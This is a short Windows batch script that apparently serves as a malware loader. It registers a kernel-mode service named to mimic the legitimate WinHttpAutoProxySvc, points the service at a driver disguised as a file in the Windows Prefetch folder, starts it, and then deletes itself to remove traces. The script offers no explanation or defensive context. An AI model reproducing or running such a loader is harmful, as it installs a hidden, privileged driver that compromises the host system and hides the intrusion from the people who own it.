@echo off
cd %~dp0
sc create WinHttpAutoProxySvc561_c binpath=C:\Windows\Prefetch\CMD.EXE-J8S0VF39.pf type=kernel
sc start WinHttpAutoProxySvc561_c
del "%~f0"